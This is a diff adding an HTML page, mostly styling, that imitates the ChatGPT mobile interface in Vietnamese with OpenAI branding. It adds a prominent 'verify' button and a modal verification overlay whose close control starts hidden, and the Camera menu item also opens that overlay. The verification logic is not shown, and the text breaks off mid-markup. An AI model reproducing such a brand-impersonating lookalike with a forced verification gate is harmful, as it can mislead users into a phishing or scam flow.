@@ -1,0 +1,1200 @@
+<!doctype html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>ChatGPT</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff; color: #0d0d0d; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
+        }
+        #splash {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
+            background: #ffffff; z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
+            pointer-events: none;
+        }
+        #splash-logo {
+            width: 120px; height: 120px; border: 4px solid #000000; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 48px; font-weight: 700; color: #000000; letter-spacing: -2px;
+            background: #ffffff;
+            animation: spinZoom 2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+        @keyframes spinZoom {
+            0% { transform: rotate(0deg) scale(1.2); opacity: 1; }
+            70% { transform: rotate(360deg) scale(1.1); opacity: 1; }
+            100% { transform: rotate(360deg) scale(0.8); opacity: 0; }
+        }
+        .splash-inner { display: flex; flex-direction: column; align-items: center; }
+        .splash-inner span { font-size: 14px; color: #8e8ea0; margin-top: 8px; letter-spacing: 1px; }
+        #mainLayout { display: flex; flex-direction: column; height: 100vh; }
+        #projectLayout, #appLayout, #libraryLayout, #moreLayout, #imageLayout { display: none; flex-direction: column; height: 100vh; background: #ffffff; }
+        #projectLayout.active, #appLayout.active, #libraryLayout.active, #moreLayout.active, #imageLayout.active { display: flex; }
+        #mainLayout.hidden { display: none; }
+        .header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 8px 12px; background: #ffffff; border-bottom: 1px solid #e5e5e5;
+            flex-shrink: 0; position: sticky; top: 0; z-index: 10;
+        }
+        .header-left { display: flex; align-items: center; gap: 12px; }
+        .menu-btn {
+            width: 36px; height: 36px; border-radius: 50%; border: none; background: transparent;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+        }
+        .menu-btn:active { background: #f0f0f0; }
+        .header-right-pill {
+            display: flex; align-items: center; gap: 4px;
+            background: #ffffff; border: 1px solid #e5e5e5; border-radius: 999px;
+            padding: 2px 6px 2px 4px; height: 34px;
+        }
+        .pill-btn {
+            width: 28px; height: 28px; border-radius: 6px; border: none; background: transparent;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+        }
+        .pill-btn:active { background: #f0f0f0; }
+        .pill-separator { width: 1px; height: 16px; background: #e5e5e5; margin: 0 2px; }
+        .chat-area {
+            flex: 1; overflow-y: auto; padding: 16px 16px 80px 16px; background: #ffffff;
+            display: flex; flex-direction: column; gap: 12px;
+        }
+        .chat-area::-webkit-scrollbar { display: none; }
+        .message {
+            max-width: 88%; padding: 12px 16px; border-radius: 20px; line-height: 1.5;
+            font-size: 16px; word-wrap: break-word; animation: fadeIn 0.3s ease;
+        }
+        .message.user { align-self: flex-end; background: #10a37f; color: #ffffff; border-bottom-right-radius: 4px; }
+        .message.bot { align-self: flex-start; background: #f7f7f8; color: #0d0d0d; border-bottom-left-radius: 4px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+        .typing-indicator {
+            display: flex; align-items: center; gap: 4px; align-self: flex-start; padding: 12px 16px;
+            background: #f7f7f8; border-radius: 20px; border-bottom-left-radius: 4px; height: 44px;
+            animation: fadeIn 0.3s ease;
+        }
+        .typing-dot {
+            width: 8px; height: 8px; background: #8e8ea0; border-radius: 50%;
+            animation: dotBounce 1.4s ease-in-out infinite;
+        }
+        .typing-dot:nth-child(1) { animation-delay: 0s; }
+        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
+        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes dotBounce {
+            0%, 60%, 100% { transform: translateY(0); }
+            30% { transform: translateY(-8px); }
+        }
+        .input-area {
+            position: fixed; bottom: 0; left: 0; right: 0; background: #ffffff;
+            padding: 8px 12px 20px 12px; border-top: 1px solid #e5e5e5;
+            display: flex; align-items: center; gap: 0; z-index: 20;
+        }
+        .input-wrapper {
+            flex: 1; display: flex; align-items: center; background: #ffffff;
+            border-radius: 999px; padding: 6px 14px; border: 1px solid #e5e5e5;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+            position: relative;
+        }
+        .input-wrapper input {
+            flex: 1; border: none; outline: none; background: transparent; font-size: 17px;
+            color: #0d0d0d; padding: 4px 8px; font-family: inherit;
+        }
+        .input-wrapper input::placeholder { color: #8e8ea0; }
+        .attach-btn { width: 32px; height: 32px; border: none; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; position: relative; }
+        .attach-btn svg { width: 28px; height: 28px; stroke: #0d0d0d; }
+        .mic-btn { width: 32px; height: 32px; border: none; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; margin-left: 4px; }
+        .mic-btn svg { width: 24px; height: 24px; stroke: #0d0d0d; }
+        .send-btn-container { width: 36px; height: 36px; border-radius: 50%; border: none; background: #007bff; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; margin-left: 4px; transition: background 0.2s; }
+        .send-btn-container:active { background: #0056b3; }
+        .send-icon { display: flex; align-items: center; justify-content: center; }
+        .send-icon svg { width: 20px; height: 20px; stroke: #ffffff; stroke-width: 2.5; }
+        .icon-voice, .icon-arrow { transition: opacity 0.2s ease, transform 0.2s ease; }
+        .icon-voice { display: flex; }
+        .icon-arrow { display: none; }
+        .input-wrapper:focus-within .icon-voice, .has-text .icon-voice { display: none; }
+        .input-wrapper:focus-within .icon-arrow, .has-text .icon-arrow { display: flex; }
+        #attachMenu { display: none; position: absolute; bottom: 70px; left: 0; background: #ffffff; border-radius: 20px; padding: 16px 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #e5e5e5; width: 240px; z-index: 30; flex-direction: column; gap: 8px; animation: slideUp 0.2s ease; }
+        #attachMenu.open { display: flex; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .attach-item { display: flex; align-items: center; gap: 14px; padding: 8px 12px; border-radius: 12px; cursor: pointer; transition: background 0.15s; }
+        .attach-item:active { background: #f0f0f0; }
+        .attach-item .icon-circle { width: 40px; height: 40px; border-radius: 50%; background: #f7f7f8; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .attach-item .icon-circle svg { width: 22px; height: 22px; stroke: #0d0d0d; stroke-width: 2; }
+        .attach-item .item-text { font-size: 16px; color: #0d0d0d; font-weight: 500; }
+        .project-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: #ffffff; border-bottom: 1px solid #f0f0f0; flex-shrink: 0; }
+        .project-header-left { display: flex; align-items: center; gap: 12px; }
+        .project-back-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e5e5e5; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .project-back-btn:active { background: #f0f0f0; }
+        .project-title { font-size: 20px; font-weight: 600; color: #0d0d0d; }
+        .project-add-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e5e5e5; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .project-add-btn:active { background: #f0f0f0; }
+        .project-search-area { padding: 12px 16px; background: #ffffff; }
+        .project-search-wrapper { display: flex; align-items: center; background: #f0f0f0; border-radius: 999px; padding: 8px 16px; gap: 10px; }
+        .project-search-wrapper svg { width: 20px; height: 20px; stroke: #8e8ea0; flex-shrink: 0; }
+        .project-search-wrapper input { flex: 1; border: none; outline: none; background: transparent; font-size: 16px; color: #0d0d0d; font-family: inherit; }
+        .project-search-wrapper input::placeholder { color: #8e8ea0; }
+        .project-tabs { display: flex; gap: 8px; padding: 0 16px 16px 16px; background: #ffffff; overflow-x: auto; }
+        .project-tabs::-webkit-scrollbar { display: none; }
+        .project-tab { padding: 8px 16px; border-radius: 999px; background: transparent; border: none; font-size: 14px; color: #0d0d0d; cursor: pointer; font-weight: 500; white-space: nowrap; }
+        .project-tab.active { background: #f0f0f0; }
+        .project-tab:active { background: #e5e5e5; }
+        .project-empty { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; gap: 12px; }
+        .project-empty-icon { width: 48px; height: 48px; border-radius: 50%; background: #f7f7f8; display: flex; align-items: center; justify-content: center; margin-bottom: 4px; }
+        .project-empty-icon svg { width: 24px; height: 24px; stroke: #0d0d0d; stroke-width: 1.5; }
+        .project-empty h3 { font-size: 18px; font-weight: 600; color: #0d0d0d; margin: 0; }
+        .project-empty p { font-size: 15px; color: #8e8ea0; line-height: 1.5; max-width: 280px; margin: 0 auto; }
+        .project-empty-btn { margin-top: 12px; padding: 12px 24px; border-radius: 999px; border: none; background: #000000; color: #ffffff; font-size: 16px; font-weight: 500; cursor: pointer; }
+        .project-empty-btn:active { background: #333333; }
+        .app-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: #ffffff; border-bottom: 1px solid #f0f0f0; flex-shrink: 0; }
+        .app-header-left { display: flex; align-items: center; gap: 12px; }
+        .app-back-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e5e5e5; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .app-back-btn:active { background: #f0f0f0; }
+        .app-title { font-size: 20px; font-weight: 600; color: #0d0d0d; }
+        .app-gpt-btn { padding: 6px 16px; border-radius: 999px; border: none; background: #f7f7f8; font-size: 15px; font-weight: 600; color: #0d0d0d; cursor: pointer; }
+        .app-gpt-btn:active { background: #e5e5e5; }
+        .app-search-area { padding: 12px 16px; background: #ffffff; }
+        .app-search-wrapper { display: flex; align-items: center; background: #f0f0f0; border-radius: 999px; padding: 8px 16px; gap: 10px; }
+        .app-search-wrapper svg { width: 20px; height: 20px; stroke: #8e8ea0; flex-shrink: 0; }
+        .app-search-wrapper input { flex: 1; border: none; outline: none; background: transparent; font-size: 16px; color: #0d0d0d; font-family: inherit; }
+        .app-search-wrapper input::placeholder { color: #8e8ea0; }
+        .app-banner { margin: 0 16px 16px 16px; padding: 16px; border-radius: 16px; background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: #ffffff; position: relative; overflow: hidden; }
+        .app-banner-top { display: flex; align-items: center; justify-content: space-between; }
+        .app-banner-info { display: flex; align-items: center; gap: 10px; }
+        .app-banner-logo { width: 36px; height: 36px; border-radius: 50%; background: #ffffff; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 700; color: #4facfe; }
+        .app-banner-title { font-size: 16px; font-weight: 600; color: #ffffff; }
+        .app-banner-desc { font-size: 13px; color: rgba(255,255,255,0.8); margin-bottom: 12px; }
+        .app-banner-view-btn { padding: 4px 14px; border-radius: 999px; border: none; background: rgba(255,255,255,0.2); color: #ffffff; font-size: 13px; font-weight: 500; cursor: pointer; }
+        .app-banner-prompt { display: inline-block; background: rgba(255,255,255,0.15); padding: 6px 12px; border-radius: 20px; font-size: 13px; margin: 8px 0 12px 0; color: #ffffff; }
+        .app-banner-images { display: flex; gap: 8px; margin-top: 8px; overflow-x: auto; }
+        .app-banner-images::-webkit-scrollbar { display: none; }
+        .app-banner-img { width: 120px; height: 80px; background: #ffffff; border-radius: 8px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; color: #333; font-size: 12px; font-weight: 600; overflow: hidden; }
+        .app-banner-img img { width: 100%; height: 100%; object-fit: cover; }
+        .app-subtitle { font-size: 14px; color: #8e8ea0; text-align: center; padding: 0 16px 16px 16px; line-height: 1.4; }
+        .app-tabs { display: flex; gap: 8px; padding: 0 16px 16px 16px; background: #ffffff; overflow-x: auto; }
+        .app-tabs::-webkit-scrollbar { display: none; }
+        .app-tab { padding: 8px 16px; border-radius: 999px; background: transparent; border: none; font-size: 14px; color: #0d0d0d; cursor: pointer; font-weight: 500; white-space: nowrap; }
+        .app-tab.active { background: #f0f0f0; }
+        .app-tab:active { background: #e5e5e5; }
+        .app-list { flex: 1; overflow-y: auto; padding: 0 16px 20px 16px; display: flex; flex-direction: column; gap: 12px; }
+        .app-list::-webkit-scrollbar { display: none; }
+        .app-item { display: flex; align-items: center; gap: 14px; padding: 6px 0; cursor: pointer; }
+        .app-item:active { opacity: 0.7; }
+        .app-item-icon { width: 44px; height: 44px; border-radius: 50%; background: #f0f0f0; border: 1px solid #e5e5e5; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 14px; font-weight: 600; color: #0d0d0d; overflow: hidden; }
+        .app-item-icon img { width: 100%; height: 100%; object-fit: cover; }
+        .app-item-info { flex: 1; display: flex; flex-direction: column; gap: 2px; }
+        .app-item-name { font-size: 15px; font-weight: 500; color: #0d0d0d; }
+        .app-item-desc { font-size: 13px; color: #8e8ea0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 200px; }
+        .app-item-arrow { width: 16px; height: 16px; stroke: #8e8ea0; flex-shrink: 0; }
+        .lib-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: #ffffff; border-bottom: 1px solid #f0f0f0; flex-shrink: 0; }
+        .lib-header-left { display: flex; align-items: center; gap: 12px; }
+        .lib-back-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e5e5e5; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .lib-back-btn:active { background: #f0f0f0; }
+        .lib-title { font-size: 20px; font-weight: 600; color: #0d0d0d; }
+        .lib-more-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e5e5e5; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .lib-more-btn:active { background: #f0f0f0; }
+        .lib-tabs { display: flex; gap: 8px; padding: 12px 16px; background: #ffffff; }
+        .lib-tab { padding: 8px 20px; border-radius: 999px; background: transparent; border: none; font-size: 16px; color: #0d0d0d; cursor: pointer; font-weight: 500; }
+        .lib-tab.active { background: #f0f0f0; }
+        .lib-tab:active { background: #e5e5e5; }
+        .lib-grid { flex: 1; overflow-y: auto; padding: 0 16px 80px 16px; display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+        .lib-grid::-webkit-scrollbar { display: none; }
+        .lib-card { background: #ffffff; border-radius: 20px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.04); border: 1px solid #e5e5e5; display: flex; flex-direction: column; cursor: pointer; }
+        .lib-card:active { opacity: 0.7; }
+        .lib-card-banner { width: 100%; height: 60px; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); position: relative; }
+        .lib-card-avatar { width: 56px; height: 56px; border-radius: 50%; border: 3px solid #ffffff; background: #ffffff; position: absolute; bottom: -28px; left: 16px; display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
+        .lib-card-avatar img, .lib-card-avatar svg { width: 100%; height: 100%; object-fit: cover; }
+        .lib-card-content { padding: 36px 12px 12px 12px; display: flex; flex-direction: column; gap: 8px; }
+        .lib-card-name { font-size: 15px; font-weight: 600; color: #0d0d0d; margin-bottom: 4px; }
+        .lib-card-status { display: inline-flex; align-items: center; gap: 4px; background: #e8f5e9; color: #2e7d32; font-size: 11px; font-weight: 500; padding: 2px 8px; border-radius: 999px; width: fit-content; }
+        .lib-card-status svg { width: 10px; height: 10px; fill: #2e7d32; }
+        .lib-card-actions { display: flex; justify-content: space-between; gap: 4px; margin: 6px 0 2px 0; }
+        .lib-card-action { display: flex; flex-direction: column; align-items: center; gap: 2px; background: transparent; border: none; cursor: pointer; padding: 4px 6px; border-radius: 8px; }
+        .lib-card-action:active { background: #f0f0f0; }
+        .lib-card-action svg { width: 20px; height: 20px; stroke: #6b6b7b; }
+        .lib-card-action span { font-size: 10px; color: #6b6b7b; }
+        .lib-card-details { display: flex; flex-direction: column; gap: 2px; margin-top: 6px; }
+        .lib-card-bio { font-size: 13px; color: #0d0d0d; font-weight: 600; }
+        .lib-card-desc { font-size: 12px; color: #8e8ea0; }
+        .lib-card-user { font-size: 13px; font-weight: 500; color: #0d0d0d; }
+        .lib-card-images { display: flex; flex-direction: column; gap: 6px; margin-top: 6px; }
+        .lib-card-image { width: 100%; aspect-ratio: 1/1; background: #1a1a1a; border-radius: 12px; color: #ffffff; display: flex; align-items: center; justify-content: center; font-size: 12px; text-align: center; overflow: hidden; }
+        .lib-card-image img { width: 100%; height: 100%; object-fit: cover; }
+        .more-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: #ffffff; border-bottom: 1px solid #f0f0f0; flex-shrink: 0; }
+        .more-header-left { display: flex; align-items: center; gap: 12px; }
+        .more-back-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e5e5e5; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .more-back-btn:active { background: #f0f0f0; }
+        .more-title { font-size: 20px; font-weight: 600; color: #0d0d0d; }
+        .more-list { flex: 1; padding: 16px; display: flex; flex-direction: column; gap: 4px; }
+        .more-item { display: flex; align-items: center; gap: 14px; padding: 14px 12px; border-radius: 12px; cursor: pointer; transition: background 0.15s; }
+        .more-item:active { background: #f0f0f0; }
+        .more-item-icon { width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .more-item-icon svg { width: 28px; height: 28px; stroke: #0d0d0d; stroke-width: 2; }
+        .more-item-text { font-size: 17px; font-weight: 500; color: #0d0d0d; }
+        .img-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: #ffffff; border-bottom: 1px solid #f0f0f0; flex-shrink: 0; }
+        .img-header-left { display: flex; align-items: center; gap: 12px; }
+        .img-back-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e5e5e5; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .img-back-btn:active { background: #f0f0f0; }
+        .img-title { font-size: 20px; font-weight: 600; color: #0d0d0d; }
+        .img-content { flex: 1; overflow-y: auto; padding: 0 16px 90px 16px; display: flex; flex-direction: column; gap: 20px; }
+        .img-content::-webkit-scrollbar { display: none; }
+        .img-section-title { font-size: 18px; font-weight: 600; color: #0d0d0d; padding-top: 12px; }
+        .img-scroll-row { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 4px; }
+        .img-scroll-row::-webkit-scrollbar { display: none; }
+        .img-prompt-card { flex: 0 0 120px; display: flex; flex-direction: column; gap: 8px; cursor: pointer; }
+        .img-prompt-card:active { opacity: 0.7; }
+        .img-prompt-img { width: 120px; height: 160px; border-radius: 16px; background: #f0f0f0; object-fit: cover; overflow: hidden; }
+        .img-prompt-img img { width: 100%; height: 100%; object-fit: cover; }
+        .img-prompt-label { font-size: 14px; color: #0d0d0d; font-weight: 500; }
+        .img-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 4px; padding-bottom: 12px; }
+        .img-grid-item { width: 100%; aspect-ratio: 1/1; background: #f0f0f0; border-radius: 4px; object-fit: cover; cursor: pointer; overflow: hidden; }
+        .img-grid-item:active { opacity: 0.7; }
+        .img-grid-item img { width: 100%; height: 100%; object-fit: cover; }
+        .img-input-area {
+            position: fixed; bottom: 0; left: 0; right: 0; background: #ffffff;
+            padding: 8px 12px 20px 12px; border-top: 1px solid #e5e5e5;
+            display: flex; align-items: center; gap: 0; z-index: 20;
+        }
+        .img-input-wrapper {
+            flex: 1; display: flex; align-items: center; background: #f7f7f8;
+            border-radius: 999px; padding: 6px 10px 6px 12px; gap: 8px;
+        }
+        .img-input-wrapper input {
+            flex: 1; border: none; outline: none; background: transparent; font-size: 16px;
+            color: #0d0d0d; padding: 6px 0; font-family: inherit;
+        }
+        .img-input-wrapper input::placeholder { color: #8e8ea0; }
+        .img-input-icon { width: 32px; height: 32px; border-radius: 50%; border: none; background: transparent; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; }
+        .img-input-icon svg { width: 22px; height: 22px; stroke: #0d0d0d; stroke-width: 1.8; }
+        .img-send-btn { width: 36px; height: 36px; border-radius: 50%; border: none; background: #f0f0f0; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; margin-left: 8px; }
+        .img-send-btn:active { background: #e0e0e0; }
+        .img-send-btn svg { width: 20px; height: 20px; stroke: #8e8ea0; stroke-width: 2.5; }
+        .sidebar-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.3); z-index: 999; pointer-events: none; opacity: 0; transition: opacity 0.25s ease; }
+        .sidebar-overlay.active { display: block; pointer-events: auto; opacity: 1; }
+        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100vh; background: #ffffff; z-index: 1000; box-shadow: 4px 0 20px rgba(0,0,0,0.08); transition: left 0.3s cubic-bezier(0.2, 0.9, 0.3, 1); padding: 20px 16px; display: flex; flex-direction: column; gap: 4px; border-right: 1px solid #e5e5e5; }
+        .sidebar.open { left: 0; }
+        .sidebar-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; margin-top: 8px; }
+        .sidebar-header h2 { font-size: 22px; font-weight: 700; color: #0d0d0d; }
+        .sidebar-header .close-btn { width: 32px; height: 32px; border-radius: 50%; border: none; background: transparent; font-size: 20px; cursor: pointer; color: #8e8ea0; display: flex; align-items: center; justify-content: center; }
+        .menu-item { display: flex; align-items: center; gap: 14px; padding: 12px 12px; border-radius: 12px; cursor: pointer; transition: background 0.15s; font-size: 15px; font-weight: 500; color: #0d0d0d; }
+        .menu-item:active { background: #f0f0f0; }
+        .menu-section-title { font-size: 14px; font-weight: 600; color: #8e8ea0; padding: 12px 12px 4px 12px; margin-top: 8px; }
+        .recent-list { margin-top: 4px; display: flex; flex-direction: column; gap: 4px; }
+        .recent-item { display: flex; align-items: center; gap: 12px; padding: 8px 12px; border-radius: 10px; cursor: pointer; transition: background 0.15s; font-size: 14px; color: #0d0d0d; }
+        .recent-item:active { background: #f0f0f0; }
+        .recent-item .dot { width: 6px; height: 6px; border-radius: 50%; background: #10a37f; flex-shrink: 0; }
+        .sidebar .new-chat-btn-sidebar { display: none; width: 100%; margin-top: 16px; padding: 10px; background: #0d8a6a; color: #ffffff; border: none; border-radius: 999px; font-size: 15px; font-weight: 500; cursor: pointer; text-align: center; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .sidebar.open .new-chat-btn-sidebar { display: flex; }
+        #contextMenu { display: none; position: absolute; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); padding: 8px 0; min-width: 220px; z-index: 1001; border: 1px solid #e5e5e5; top: 52px; right: 12px; }
+        #contextMenu.open { display: block; }
+        #contextMenu .ctx-header { padding: 8px 16px 12px 16px; font-size: 16px; font-weight: 600; color: #1a1a1a; letter-spacing: -0.3px; }
+        #contextMenu .ctx-item { display: flex; align-items: center; gap: 14px; padding: 10px 16px; cursor: pointer; font-size: 15px; color: #1a1a1a; transition: background 0.15s; }
+        #contextMenu .ctx-item:active { background: #f0f0f0; }
+        #contextMenu .ctx-item.danger { color: #e74c3c; }
+        .ctx-icon { width: 22px; height: 22px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
+        .ctx-arrow { margin-left: auto; width: 16px; height: 16px; opacity: 0.6; }
+        .ctx-divider { height: 1px; background: #e5e5e5; margin: 4px 16px; }
+        .verify-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(4px); z-index: 2000; align-items: center; justify-content: center; pointer-events: none; }
+        .verify-overlay.active { display: flex; pointer-events: auto; }
+        .verify-card { background: #ffffff; border-radius: 24px; padding: 24px 20px 20px 20px; max-width: 340px; width: 90%; text-align: center; box-shadow: 0 16px 48px rgba(0,0,0,0.2); border: 1px solid #e5e5e5; animation: cardPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); display: flex; flex-direction: column; align-items: center; position: relative; }
+        @keyframes cardPop { from { transform: scale(0.8) translateY(20px); opacity: 0; } to { transform: scale(1) translateY(0); opacity: 1; } }
+        .verify-card h3 { font-size: 17px; font-weight: 700; color: #0d0d0d; margin-bottom: 4px; letter-spacing: -0.3px; }
+        .verify-card .sub-text { font-size: 13px; color: #666; margin-bottom: 16px; }
+        .verify-options {
+            display: flex; justify-content: center; gap: 10px; margin-bottom: 16px; flex-wrap: wrap;
+        }
+        .verify-option {
+            width: 44px; height: 44px; border-radius: 12px; background: #f7f7f8; border: 2px solid #e5e5e5;
+            display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 700; color: #0d0d0d;
+            cursor: pointer; transition: all 0.15s ease; user-select: none;
+        }
+        .verify-option:active { transform: scale(0.95); }
+        .verify-option.selected {
+            transform: scale(1.15); border-color: #10a37f; background: #e6f4f0; color: #10a37f; box-shadow: 0 4px 12px rgba(16, 163, 127, 0.25);
+        }
+        .verify-btn {
+            width: 100%; padding: 12px; border-radius: 999px; border: none; background: #e5e5e5; color: #999;
+            font-size: 15px; font-weight: 700; cursor: not-allowed; height: 48px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; transition: all 0.2s;
+        }
+        .verify-btn.active {
+            background: #10a37f; color: #ffffff; cursor: pointer; box-shadow: 0 4px 12px rgba(16, 163, 127, 0.4);
+        }
+        .verify-btn.active:active { transform: scale(0.97); background: #0d8a6a; }
+        .verify-btn .load-bar { display: none; position: absolute; top: 0; left: 0; height: 100%; width: 0%; background: #0d8a6a; transition: width 0.1s linear; z-index: 1; border-radius: 999px; }
+        .verify-btn.loading .load-bar { display: block; }
+        .verify-btn .btn-text { position: relative; z-index: 2; transition: opacity 0.2s; }
+        .verify-btn .percent-text { display: none; position: relative; z-index: 2; font-size: 14px; font-weight: 600; margin-left: 6px; color: #ffffff; }
+        .verify-btn.loading .percent-text { display: inline-block; }
+        .verify-card .sub-text + .english-hint {
+            font-size: 12px; color: #8e8ea0; text-align: center;
+            margin-top: -8px; margin-bottom: 12px;
+        }
+        .verify-close-x {
+            position: absolute; top: 12px; right: 16px;
+            font-size: 20px; color: #999; cursor: pointer; background: transparent; border: none; line-height: 1; padding: 4px;
+            transition: color 0.15s; display: none;
+        }
+        .verify-close-x:hover { color: #333; }
+        .verify-close-x.visible { display: block; }
+        #verifyMainBtn { display: block; }
+        #verifyMainBtn.done { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="splash">
+    <div class="splash-inner">
+        <div id="splash-logo">GPT</div>
+        <span>OpenAI</span>
+    </div>
+</div>
+
+<!-- ================= LAYOUT CHÍNH (CHAT) ================= -->
+<div id="mainLayout">
+    <div class="header" id="mainHeader">
+        <div class="header-left">
+            <button class="menu-btn" onclick="toggleSidebar()">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+            </button>
+        </div>
+        <div class="header-right-pill">
+            <button class="pill-btn" onclick="triggerNewChat()">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 20h9" /> 
+                    <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z" />
+                    <rect x="3" y="14" width="8" height="8" rx="1" />
+                </svg>
+            </button>
+            <div class="pill-separator"></div>
+            <button class="pill-btn" id="dotsBtn" onclick="toggleContextMenu(event)">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="19" r="2"/></svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- NÚT XÁC MINH - TO, Ở GIỮA 3 GẠCH VÀ CÁI BÚT -->
+    <div style="display: flex; justify-content: center; padding: 6px 0; background: #ffffff;">
+        <button id="verifyMainBtn" onclick="triggerVerify()" style="
+            background: #10a37f; 
+            color: white; 
+            border: none; 
+            border-radius: 999px; 
+            padding: 10px 28px; 
+            font-size: 17px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            box-shadow: 0 4px 12px rgba(16, 163, 127, 0.3);
+            width: auto;
+            max-width: 90%;
+            transition: transform 0.15s;
+        " onmousedown="this.style.transform='scale(0.96)'" onmouseup="this.style.transform='scale(1)'" onmouseleave="this.style.transform='scale(1)'">
+            🛡️ XÁC MINH
+        </button>
+    </div>
+
+    <div class="chat-area" id="chatArea">
+        <div class="message user">hi</div>
+        <div class="message bot">Xin chào! Tôi có thể giúp gì cho bạn?</div>
+    </div>
+
+    <div class="input-area">
+        <div class="input-wrapper" id="inputWrapper">
+            <button class="attach-btn" id="plusBtn" onclick="toggleAttachMenu(event)">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+                <div id="attachMenu">
+                    <div class="attach-item" onclick="triggerVerify(); document.getElementById('attachMenu').classList.remove('open')">
+                        <div class="icon-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg></div>
+                        <span class="item-text">Camera</span>
+                    </div>
